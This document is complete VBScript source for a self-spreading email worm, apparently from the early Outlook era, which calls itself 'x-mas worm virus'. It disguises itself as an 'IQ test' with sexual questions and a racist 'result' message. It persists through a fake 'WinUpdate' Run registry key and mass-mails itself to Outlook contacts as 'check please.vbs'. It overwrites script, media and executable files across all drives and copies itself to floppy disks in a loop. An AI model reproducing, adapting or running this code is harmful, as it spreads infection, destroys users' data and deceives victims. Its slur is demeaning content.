'x-mas worm virus
On error resume next
randomize
set fso=createobject("scripting.filesystemobject")
set wscriptshell=createobject("wscript.shell")
set drives=fso.drives
for each drive in drives
if drive="C:" then
if drive.isready then
drivefull=drive & "\"
set e5d=fso.getfolder(drivefull)
set subs=e5d.subfolders
for each subfolder in subs
subst=mid(subfolder.path,4,3)
if subst="WIN" then
auto=subfolder.path
end if
next
end if
end if
next
autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
if wscript.scriptfullname <> autos then
ei=msgbox("This is IQ test version 3.2 from TrendSoftware.Answer Yes or No to the following questions,and check your IQ level.Do you wish to continue?",4,"IQtest ver 3.2")
if ei=6 then
bi=msgbox("Do you think that a woman and a man can develop a strong frienship without sex?",3,"Question 1/11")
if bi=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
ci=msgbox("Do you usually think solutions that seem to be weird for other people?",3,"Question 2/11")
if ci=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
di=msgbox("Is there any difference between a hot woman and a HOT woman?",3,"Question 3/11")
if di=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
ii=msgbox("Do you believe from aliens pictures that they exist?",3,"Question 4/11")
if ii=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
fi=msgbox("If an unknown but EXTREMELY hot woman/man says to you:Taste me starting from  tits,would you do it?",3,"Question 5/11")
if fi=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
gi=msgbox("Supposing you make love with Monica Bellucci without any protection and suddenly she says:I have AIDS,were you to punish her?",3,"Question 6/11")
if gi=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
hi=msgbox("I can see your death.Do you believe this?",3,"Question 7/11")
if hi=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
ji=msgbox("Do you know what the word protozoa means?",3,"Question 8/11")
if ji=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
ki=msgbox("Do you feel you were born lucky?",3,"Question 9/11")
if ki=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
li=msgbox("Do you masturbate at least 4 times a week?",3,"Question 10/11")
if li=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
mi=msgbox("Have you ever thought the possibility you are a genius?",3,"Final Question!")
if mi=2 then
msgbox "Try again later!",64,"IQtest ver 3.2"
wscript.quit
end if
my=int((4*Rnd)+1)
Select case my
Case 1 msgbox "Highest possible IQ:150--->Your IQ:60-80 ,not really good,are you a negro?",16,"You negros suck!"
Case 2 msgbox "Highest possible IQ:150--->Your IQ:80-100 ,average IQ,somehow OK.",32,"Not so dumb i expected U 2 B!"
Case 3 msgbox "Highest possible IQ:150--->Your IQ:100-120 ,you are smart enough.",64,"OK my man,Your brains does really exist"
Case else msgbox "Highest possible IQ:150--->Your IQ:120-150,extremely smart,CinGRAtuLaTIoNs!!",48,"GENIUS DETECTED! o;)"
End Select
msgbox "Thanks for using TrendSoftware products!",48,"TrendSoftware IQ Test ver 3.2"
wscript.quit
end if
msgbox "Try again later!",64,"IQ Test ver 3.2"
end if
mailed=auto & "\check please.vbs"
fso.copyfile wscript.scriptfullname,mailed
if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
set out=createobject("Outlook.Application")
if out="Outlook" then 
set mapi=out.GetNameSpace("MAPI")
set newitem=mapi.getdefaultfolder(6)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="x-mas mail"
item.Body="check please"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newitem=mapi.getdefaultfolder(5)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="x-mas mail"
item.Body="check please"
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newmail=out.createitem(0)
newmail.to="santa@mail.com"
newmail.subject="santa gift"
newmail.Body="happy new year"
newmail.send
set out=Nothing
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1"
end if
end if
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
list(d.path&"\")
end if
next
Sub spreadmailto (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="vbs") or (ext="vba") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub list(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spreadmailto(fil.path)
list(fil.path)
next
End Sub
payl=wscriptshell.regread("HKLM\SOFTWARE\TaskManager")
if payl="" then 
wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager","1"
end if
if payl<> 10 then
payl=payl+1
wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager",payl
end if
if payl= 10 then
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
listed(d.path&"\")
end if
next
end if
Sub spread (dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="mp3") or (ext="jpg") or (ext="mpeg") or (ext="jpeg") or (ext="mpg")or (ext="exe") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub listed(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spread(fil.path)
listed(fil.path)
next
End Sub
if month(now)= 01 and day(now)= 01 then
set dr=fso.Drives
for each d in dr
if d.DriveType=2 or d.DriveType=3 then
listed(d.path&"\")
end if
next
end if
Sub spread(dir)
on error resume next
set fso=createobject("Scripting.filesystemobject")
set f=fso.GetFolder(dir)
set cf=f.Files
for each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="mp3") or (ext="jpg") or (ext="mpeg") or (ext="jpeg") or (ext="mpg") or (ext="exe") then
fso.copyfile wscript.scriptfullname,fil.path
end if
next
End Sub
Sub listed(dir)
on error resume next
set f=fso.GetFolder(dir)
set ssf=f.Subfolders
for each fil in ssf
spread(fil.path)
listed(fil.path)
next
End Sub
payl=wscriptshell.regread("HKLM\SOFTWARE\Tasks")
if payl="" then 
wscriptshell.regwrite "HKLM\SOFTWARE\Tasks","1"
end if
if payl<> 5 then
payl=payl+1
wscriptshell.regwrite "HKLM\SOFTWARE\Tasks",payl
end if
if payl=5 then
msgbox "merry x-mas",64,"happy new year"
end if
if month(now)= 12 and day(now)= 25 then
msgbox "merry x-mas",64,"happy new year"
end if
tim=minute(time)
tim=tim+6
set thiscode=fso.opentextfile(wscript.scriptfullname,1)
code=thiscode.readall
thiscode.close
do
if not (fso.fileexists(autos)) then
set resur=fso.createtextfile(autos,true)
resur.write code
resur.close
end if
regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate")
if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then 
wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" 
end if
regvalue=""
timstandard=minute(time)
if tim>53 then
tim=01
end if
if timstandard=tim then
tim=minute(time)
tim=tim+6
trig=int((10*rnd)+1)
select case trig
case 1
floppya="a:\1.txt.vbs"
case 2
floppya="a:\2.txt.vbs"
case 3
floppya="a:\3.txt.vbs"
case 4
floppya="a:\4.txt.vbs"
case 5
floppya="a:\5.txt.vbs"
case 6
floppya="a:\6.txt.vbs"
case 7
floppya="a:\7.txt.vbs"
case 8
floppya="a:\8.txt.vbs"
case 9
floppya="a:\9.txt.vbs"
case else
floppya="a:\10.txt.vbs"
end select
set repla=fso.createtextfile(floppya,true)
repla.write code
repla.close
set repla=nothing
floppya=""
end if
loop
